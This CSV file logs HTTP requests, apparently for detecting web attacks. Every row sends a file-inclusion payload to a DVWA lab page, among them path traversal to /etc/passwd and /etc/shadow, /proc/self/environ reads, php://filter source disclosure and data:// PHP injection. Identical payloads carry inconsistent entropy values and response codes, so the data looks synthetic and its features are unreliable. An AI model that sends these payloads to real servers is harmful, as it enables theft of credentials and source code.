timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-12-24T08:58:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.079,3,4,18,0,403,4129
2025-12-24T08:58:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.697,13,4,36,0,200,2304
2025-12-24T08:59:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,3.747,13,4,22,0,200,1989
2025-12-24T08:59:10Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.606,13,4,36,0,403,3784
2025-12-24T08:59:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.103,10,4,35,0,403,884
2025-12-24T08:59:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.397,15,4,28,0,500,3026
2025-12-24T08:59:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.819,9,4,53,0,500,2117
2025-12-24T08:59:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.834,15,4,28,0,403,2348
2025-12-24T08:59:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.667,13,4,24,0,500,1451
2025-12-24T08:59:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.856,9,4,53,0,500,983
2025-12-24T08:59:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.163,3,4,18,0,403,1578
2025-12-24T08:59:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.915,13,4,36,0,500,4129
2025-12-24T09:00:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.826,10,4,27,0,403,3194
2025-12-24T09:00:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.162,10,4,35,0,500,1188
2025-12-24T09:00:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.33,10,4,19,0,403,1750
2025-12-24T09:00:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.143,15,4,28,0,200,4518
2025-12-24T09:00:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.629,10,4,35,0,200,3170
2025-12-24T09:00:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.735,10,4,19,0,200,457
2025-12-24T09:00:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.65,10,4,27,0,500,1043
2025-12-24T09:00:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.864,10,4,27,0,403,288
2025-12-24T09:00:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.523,10,4,35,0,200,321
2025-12-24T09:00:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.068,13,4,24,0,403,3379
2025-12-24T09:01:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.162,10,4,27,0,500,3074
2025-12-24T09:01:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.304,10,4,35,0,200,3303
2025-12-24T09:01:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.014,10,4,27,0,500,3441
2025-12-24T09:01:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.137,13,4,36,0,403,3079
2025-12-24T09:01:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.236,13,4,24,0,200,544
2025-12-24T09:01:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.198,3,4,18,0,403,3645
2025-12-24T09:01:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.744,10,4,27,0,403,943
2025-12-24T09:01:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.876,13,4,36,0,500,1990
2025-12-24T09:01:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.688,10,4,27,0,500,4109
2025-12-24T09:01:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.332,13,4,36,0,403,3131
2025-12-24T09:02:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.137,13,4,22,0,403,4464
2025-12-24T09:02:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.034,3,4,18,0,403,3380
2025-12-24T09:02:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.913,13,4,24,0,500,3282
2025-12-24T09:02:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.21,10,4,19,0,200,4471
2025-12-24T09:02:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.754,10,4,35,0,500,2884
2025-12-24T09:02:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.499,15,4,28,0,200,1926
2025-12-24T09:02:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.846,13,4,24,0,200,1934
2025-12-24T09:02:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.915,9,4,53,0,403,4071
2025-12-24T09:02:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.814,10,4,35,0,200,3646
2025-12-24T09:02:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.081,10,4,19,0,500,1625
2025-12-24T09:03:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.32,3,4,18,0,200,2546
2025-12-24T09:03:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.505,10,4,35,0,200,356
2025-12-24T09:03:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.881,10,4,19,0,500,1779
2025-12-24T09:03:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.483,10,4,35,0,200,1078
2025-12-24T09:03:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.991,13,4,36,0,200,3216
2025-12-24T09:03:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.526,10,4,35,0,403,1074
2025-12-24T09:03:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.38,13,4,22,0,200,1147
2025-12-24T09:03:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.667,9,4,53,0,500,512
2025-12-24T09:03:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.855,10,4,19,0,200,2142
2025-12-24T09:03:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.987,10,4,19,0,200,968
2025-12-24T09:04:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.628,10,4,27,0,403,1581
2025-12-24T09:04:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.284,13,4,24,0,200,3516
2025-12-24T09:04:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.97,9,4,53,0,500,1149
2025-12-24T09:04:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.972,13,4,36,0,403,1445
2025-12-24T09:04:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.017,13,4,36,0,200,3316
2025-12-24T09:04:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.896,9,4,53,0,500,4718
2025-12-24T09:04:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.668,15,4,28,0,200,3589
2025-12-24T09:04:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.738,13,4,22,0,403,3214
2025-12-24T09:04:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.798,15,4,28,0,200,1949
2025-12-24T09:04:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.578,10,4,35,0,200,2916
2025-12-24T09:05:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.979,10,4,19,0,500,1512
2025-12-24T09:05:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.521,15,4,28,0,403,4032
2025-12-24T09:05:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.98,10,4,35,0,500,1328
2025-12-24T09:05:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,3.683,13,4,22,0,500,4112
2025-12-24T09:05:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.752,13,4,24,0,500,2340
2025-12-24T09:05:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.931,13,4,24,0,200,2915
2025-12-24T09:05:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.823,9,4,53,0,403,1993
2025-12-24T09:05:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.181,9,4,53,0,200,4501
2025-12-24T09:05:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.657,3,4,18,0,403,1279
2025-12-24T09:05:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.189,13,4,22,0,200,4513
2025-12-24T09:06:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.322,3,4,18,0,403,3584
2025-12-24T09:06:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.138,10,4,27,0,500,467
2025-12-24T09:06:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.529,15,4,28,0,500,3971
2025-12-24T09:06:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.672,10,4,27,0,200,1992
2025-12-24T09:06:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.822,9,4,53,0,403,2406
2025-12-24T09:06:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.147,15,4,28,0,500,1449
2025-12-24T09:06:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,3.71,13,4,22,0,200,558
2025-12-24T09:06:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.871,10,4,35,0,500,1671
2025-12-24T09:06:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.106,10,4,27,0,500,2233
2025-12-24T09:06:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.717,10,4,19,0,500,2102
2025-12-24T09:07:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.634,15,4,28,0,200,2997
2025-12-24T09:07:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.317,10,4,35,0,200,1819
2025-12-24T09:07:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.24,9,4,53,0,500,4348
2025-12-24T09:07:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.587,9,4,53,0,500,1768
2025-12-24T09:07:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.919,10,4,35,0,200,3319
2025-12-24T09:07:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.099,15,4,28,0,403,1825
2025-12-24T09:07:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.181,10,4,19,0,200,705
2025-12-24T09:07:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.295,10,4,19,0,200,400
2025-12-24T09:07:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.823,13,4,36,0,403,4310
2025-12-24T09:07:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.792,10,4,27,0,200,1842
2025-12-24T09:08:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.921,3,4,18,0,500,1261
2025-12-24T09:08:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.781,15,4,28,0,403,2433
2025-12-24T09:08:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.585,13,4,24,0,200,4300
2025-12-24T09:08:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.755,9,4,53,0,500,445
2025-12-24T09:08:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.45,9,4,53,0,403,1993
2025-12-24T09:08:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.687,9,4,53,0,403,325
2025-12-24T09:08:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.342,15,4,28,0,500,3254
2025-12-24T09:08:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.874,13,4,24,0,200,3268
2025-12-24T09:08:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.822,3,4,18,0,200,3796
2025-12-24T09:08:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.004,10,4,27,0,403,296
2025-12-24T09:09:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.62,13,4,22,0,403,3368
2025-12-24T09:09:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.347,10,4,27,0,403,4595
2025-12-24T09:09:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.337,10,4,19,0,200,3735
2025-12-24T09:09:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.8,3,4,18,0,403,3803
